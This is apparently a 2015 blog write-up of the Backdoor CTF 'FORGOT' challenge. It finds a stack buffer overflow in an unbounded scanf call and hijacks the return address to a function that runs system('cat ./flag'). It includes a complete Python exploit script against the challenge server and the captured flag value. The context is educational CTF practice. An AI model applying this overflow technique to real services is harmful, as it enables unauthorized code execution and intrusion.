---
layout: post
title: "Backdoor CTF 2015 - FORGOT Writeup"
date: 2015-04-03 02:57:55 +0430
comments: false
categories: ctf backdoor exploit bof
---

**Backdoor 2015 FORGOT Writeup**  
**Point = 200**  
**Category = Exploit**  

> Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.  
> Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.

```
$ file forgot
forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
```

```
$ ./forgot 
What is your name?
> AAAAAAAAA

Hi AAAAAAAAA


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
> AAAAAAAAAAAAAAAAAA
Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?
```

without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is `0x08047AA`. lets see the psuedo-code :
<!--more-->
```
...
  puts("What is your name?");
  printf("> ");
  fflush(stdout);
  fgets((char *)&v19, 32, stdin);
  sub_80485DD(&v19);
  fflush(stdout);
  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
  fflush(stdout);
  puts("Enter the string to be validate");
  printf("> ");
  fflush(stdout);
  __isoc99_scanf("%s", &v8);
  for ( i = 0; ; ++i )
 ...
```
This is the interesting part since we have control on inputs. `v19` is a 32 char buffer so no vulnerabilty is there. but what about `__isoc99_scanf("%s", &v8);` ? obviously using *scanf* in such a manner is exteremly dangerous. `v8` also is a 32 char buffer. so it is also another stack buffer overflow like `ECHO`. lets check this condition : 

```
$ python -c 'print "GeeksSpeak\n"+"A"*40+"\n"' > forgot.test
hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ cat forgot.test 
GeeksSpeak
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

hamidx9@KernelsCallMe:~/ctf/backdoor/public/FORGOT$ ./forgot < forgot.test 
What is your name?
> 
Hi GeeksSpeak


                        Finite-State Automaton

I have implemented a robust FSA to validate email addresses
Throw a string at me and I will let you know if it is a valid email address

                                Cheers!

I should give you a pointer perhaps. Here: 8048654

Enter the string to be validate
Segmentation fault (core dumped)

```

and `gdb` proves this too. but how should i read the flag? do we need ROP? or something simillar? i started dumping strings in IDA and located these: 

```
.rodata:08048D9F 00000007 C ./flag
.rodata:08048DA6 00000007 C cat %s
```

these strings had been used in `0x080486CC` and finding a call system proves that like ECHO we should just using this function as RET.

by using this piece of code we have: 

```python
#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim='> '):
    data = ''
    while not data.endswith(delim):
        c = f.read(1)
        assert len(c) > 0
        data += c
    return data

def p(v):
    return struct.pack('<I', v)

def u(v):
    return struct.unpack('<I', v)[0]


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('hack.bckdr.in', 8009))
f = s.makefile('rw', bufsize=0)

readuntil(f)
f.write("A\n")
readuntil(f)
f.write("A"*32+p(0x80486CC)+"\n")

t = telnetlib.Telnet()
t.sock = s
t.interact()
```

```
$ python sol.py 
ebe2c4abf85c239c7bd0385a685c460b2c5fe1dcdb2236f87dfef826bb690adf
*** Connection closed by remote host ***
```

We've got the flag. 200pts.

HAMIDx9
